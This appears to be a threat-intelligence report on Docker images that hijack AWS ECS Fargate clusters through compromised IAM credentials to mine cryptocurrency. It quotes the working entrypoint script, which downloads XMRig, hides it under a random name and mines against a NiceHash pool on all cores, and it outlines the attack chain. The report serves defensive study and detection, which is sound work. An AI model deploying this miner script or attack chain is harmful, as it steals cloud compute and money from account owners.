package_info.package_name: Malicious Docker Images for AWS ECS Crypto Mining
package_info.package_versions: All images uploaded October-November 2023 (see full list of image names in report)
package_info.why_malicious: These container images are explicitly designed to deploy cryptocurrency mining malware (XMRig) on AWS ECS Fargate clusters. The images automate the download and execution of XMRig, hijacking cloud resources for illicit mining, and are distributed at scale via automated AWS API abuse.

malicious_snippets.code_snippet:
APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar -zxf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
mv xmrig $APP
chmod +x $APP
./$APP -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -p x -t $(nproc --all) -u [bitcoin address]
malicious_snippets.code_behavior: At container startup, the script downloads the XMRig binary from GitHub, extracts and renames the binary to a randomized name, sets execute permissions, and launches the miner using all available CPU cores, resulting in unauthorized cryptocurrency mining and exfiltration of mining results to a hardcoded NiceHash pool with a specified wallet address.

malice_analysis.why_suspicious: The script automates the download and execution of XMRig, a well-known cryptocurrency miner, directly from an external source at runtime. It uses all available CPU resources for mining, which is a common indicator of illicit resource hijacking in cloud environments.
malice_analysis.violated_expectations: Legitimate container entrypoint scripts should not download and execute external mining software, nor should they consume all CPU resources for unauthorized activities. Such behavior is inconsistent with standard application deployment practices.
malice_analysis.similar_legitimate_use: A legitimate container might download and run a binary as part of a CI/CD build or for dynamic updates, but would not mine cryptocurrency or connect to mining pools.
key_indicators: Automated download of XMRig from a public GitHub release URL
Extraction and execution of a mining binary at runtime
Use of all available CPU cores for mining operations
Presence of a hardcoded wallet address in the miner command
Absence of any legitimate application logic in the entrypoint script

malicious_snippets.code_behavior: At container build-time, the Dockerfile sets the time zone to Europe/Moscow, configuring the environment for all subsequent processes, which may indicate the threat actor's geographic preference or operational convenience.

malice_analysis.why_suspicious: While setting a time zone is not inherently malicious, the consistent use of 'Europe/Moscow' across multiple malicious images suggests attacker attribution or operational convenience, especially when there is no application logic requiring this setting.
malice_analysis.violated_expectations: Most generic container images do not set a specific time zone unless required for application logic. Setting a time zone without a clear business or technical need is atypical.
malice_analysis.similar_legitimate_use: Some applications require a specific time zone for logging, compliance, or regional operations, but this is usually documented and justified in legitimate images.
key_indicators: Consistent use of ENV TZ=Europe/Moscow across malicious images
No application logic or documentation justifying the time zone setting
Time zone setting present in images otherwise unrelated to regional requirements

attack_chain.action: Obtain compromised AWS IAM credentials (via leak or phishing).
Enumerate AWS environment and create new IAM users with administrative privileges for persistence.
attack_chain.leads_to: Establish persistent access and privilege escalation

attack_chain.action: Programmatically create multiple ECS Fargate clusters and register malicious task definitions using Docker images from attacker-controlled Docker Hub accounts.
attack_chain.leads_to: Deployment of malicious containers at scale

attack_chain.action: Launch ECS services to run 25+ tasks per malicious task definition, each pulling and executing the malicious container image.
attack_chain.leads_to: Execution of mining malware across hundreds/thousands of containers

attack_chain.action: At container runtime, /run.sh downloads and executes XMRig, mining cryptocurrency and sending results to the attacker's wallet.
attack_chain.leads_to: Resource hijacking and financial gain for attacker

behavioral_signatures: ECS task definitions referencing suspicious or unknown Docker Hub images, especially those matching known malicious naming patterns
Container entrypoints that download and execute XMRig or other mining software at runtime
Sudden spikes in ECS cluster or task creation across multiple AWS regions, particularly in accounts with no prior history of such activity
High sustained CPU usage in ECS/Fargate tasks with no legitimate workload or business justification
file_indicators: Docker images with ENV TZ=Europe/Moscow in the Dockerfile
Docker images named with patterns such as ahnoyp/ak:ma, yzsqbe/ka:si, and other similar attacker-controlled repositories
network_indicators: Outbound connections to github.com/xmrig/xmrig/releases for binary downloads
Docker Hub pulls from attacker-controlled repositories listed in the report
detection_knowledge.how_to_detect: Monitor ECS task definitions and running containers for references to suspicious Docker Hub images (see IoC list). Inspect container entrypoints for scripts that download and execute XMRig or similar mining software. Alert on spikes in ECS cluster or task creation, especially in unused or unexpected regions. Monitor for outbound network connections to known mining pools and XMRig download URLs. Correlate these findings with high CPU usage and unexpected cost anomalies in ECS/Fargate workloads to identify potential crypto mining activity.
